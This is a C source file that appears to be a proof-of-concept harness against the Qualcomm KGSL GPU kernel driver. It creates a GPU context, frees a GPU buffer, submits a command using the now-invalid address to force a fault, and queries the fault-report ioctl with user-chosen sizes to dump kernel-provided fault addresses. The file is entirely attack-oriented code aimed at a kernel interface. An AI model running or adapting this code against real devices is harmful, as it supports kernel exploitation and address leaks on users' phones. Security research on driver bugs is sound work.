#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>      // For open()
#include <sys/ioctl.h>  // For ioctl()
#include <errno.h>      // For errno
#include <string.h>     // For memset()
#include <pthread.h>
#include <sched.h>
#include <sys/syscall.h>

#include "kgsl_struct.h"
#include "kgsl.h"

int file = -1;
int ctx = -1;

int init() {

    // Initialize the KGSL driver and setup the file descriptor
    file = open("/dev/kgsl-3d0", O_RDONLY);

    if(file < 0) {
        printf("[!] Couldn't open file!\n");
        exit(1);
    }

    int ret = ioctl_ctx_create(file, &ctx);

    if (ret) {
        printf("[!] Couldn't open up a GPU context!\n");
        exit(1);
    }
    return 0;
}

int ioctl_ctx_create(int file, int *ctx_id) {

    struct kgsl_drawctxt_create req = {
        .flags = KGSL_CONTEXT_PREAMBLE |
                 KGSL_CONTEXT_SAVE_GMEM |
                 KGSL_CONTEXT_NO_GMEM_ALLOC |
                 KGSL_CONTEXT_FAULT_INFO };

        int ret;

        ret = ioctl(file, IOCTL_KGSL_DRAWCTXT_CREATE, &req);

        if (ret)
            return ret;

        *ctx_id = req.drawctxt_id;
        return 0;
}

// Function to get the fault report
int ioctl_fault_report() {
    struct kgsl_fault_report param;
    int ret;

    // Phase 1: Get number of fault types
    memset(&param, 0, sizeof(param));
    param.context_id = ctx;
    param.faultnents = 2;

    // Get fault counts
    struct kgsl_fault *faultlist = malloc(param.faultnents * sizeof(struct kgsl_fault));
    if (!faultlist) {
        perror("malloc");
        return -1;
    }

    memset(faultlist, 0, param.faultnents * sizeof(struct kgsl_fault));
    param.faultlist = (uint64_t)faultlist;
    param.faultsize = sizeof(struct kgsl_fault);

    ret = ioctl(file, IOCTL_KGSL_GET_FAULT_REPORT, &param);
    if (ret < 0) {
        perror("Phase 2 failed");
        free(faultlist);
        return -1;
    }

    printf("Fault counts per type:\n");
    for (uint32_t i = 0; i < param.faultnents; i++) {
        printf("  Type %u: count=%u, size=%u\n",
               faultlist[i].type, faultlist[i].count, faultlist[i].size);
    }

    // Allocate buffers for actual fault data
    for (uint32_t i = 0; i < param.faultnents; i++) {
        if (faultlist[i].count > 0) {
            size_t fault_data_size = faultlist[i].count * sizeof(struct kgsl_pagefault_report);
            void *fault_data = malloc(fault_data_size);
            if (!fault_data) {
                perror("malloc fault data");
                free(faultlist);
                return -1;
            }

            faultlist[i].fault = (uint64_t)fault_data;
            faultlist[i].size = sizeof(struct kgsl_pagefault_report);
        }
    }

    ret = ioctl(file, IOCTL_KGSL_GET_FAULT_REPORT, &param);
    if (ret < 0) {
        perror("Fault details retrieval failed");
        // Free all allocated buffers
        for (uint32_t i = 0; i < param.faultnents; i++) {
            if (faultlist[i].fault) {
                free((void*)faultlist[i].fault);
            }
        }
        free(faultlist);
        return -1;
    }

    printf("Fault details retrieved:\n");
    for (uint32_t i = 0; i < param.faultnents; i++) {
        if (faultlist[i].count > 0 && faultlist[i].fault) {
            printf("  Type %u has %u fault entries\n", faultlist[i].type, faultlist[i].count);

            // Print actual fault data for page faults
            if (faultlist[i].type == KGSL_FAULT_TYPE_PAGEFAULT) {
                struct kgsl_pagefault_report *reports = (struct kgsl_pagefault_report*)faultlist[i].fault;
                for (uint32_t j = 0; j < faultlist[i].count; j++) {
                    printf("    Fault %u: addr=0x%llx, type=0x%x\n",
                           j, reports[j].fault_addr, reports[j].fault_type);
                }
            }
        }
    }

    // Cleanup
    for (uint32_t i = 0; i < param.faultnents; i++) {
        if (faultlist[i].fault) {
            free((void*)faultlist[i].fault);
        }
    }
    free(faultlist);

    return 0;
}

int alloc_gpumem(int size)
{
    struct kgsl_gpuobj_alloc alloc = {
            .size = size,
            .flags = 0,
        };

        int ret = ioctl(file, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc);
        if (ret < 0) {
            perror("GPUOBJ_ALLOC failed");
            return -1;
        }
        printf("[+] Allocated GPU object ID: %u\n", alloc.id);

        struct kgsl_gpuobj_info info = {
            .id = alloc.id
        };

        ret = ioctl(file, IOCTL_KGSL_GPUOBJ_INFO, &info);
        if (ret < 0) {
            perror("GPUOBJ_INFO failed");
            return -1;
        }

        printf("[+] GPU address: 0x%llx\n", info.gpuaddr);
        return alloc.id;
}

int create_fault(int alloc_id) {
    // Get GPU address using the ID
    struct kgsl_gpuobj_info info = {
            .id = alloc_id
        };
    int ret = ioctl(file, IOCTL_KGSL_GPUOBJ_INFO, &info);
        if (ret < 0) {
            perror("GPUOBJ_INFO failed");
            return -1;
        }

    // Now use the valid GPU address for your command
    struct kgsl_command_object cmd = {
        .gpuaddr = info.gpuaddr,  // Use the retrieved GPU address
        .size = 64,
        .flags = CMDLIST_FLAGS,
        .id = alloc_id
    };

    // Free the memory to create fault condition
    struct kgsl_gpuobj_free free_req = {
        .id = alloc_id
    };
    ret = ioctl(file, IOCTL_KGSL_GPUOBJ_FREE, &free_req);
    if (ret < 0) {
        perror("GPUOBJ_FREE failed");
        return -1;
    }

    // Submit command with now-invalid address
    struct kgsl_gpu_command gpu_cmd = {
        .flags = 0,
        .cmdlist = (uint64_t)&cmd,
        .cmdsize = sizeof(cmd),
        .numcmds = 1,
        .context_id = ctx,
        .timestamp = 0
    };

    ret = ioctl(file, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
    if (ret < 0) {
        perror("GPU_COMMAND failed");
        return -1;
    }

    return 0;
}
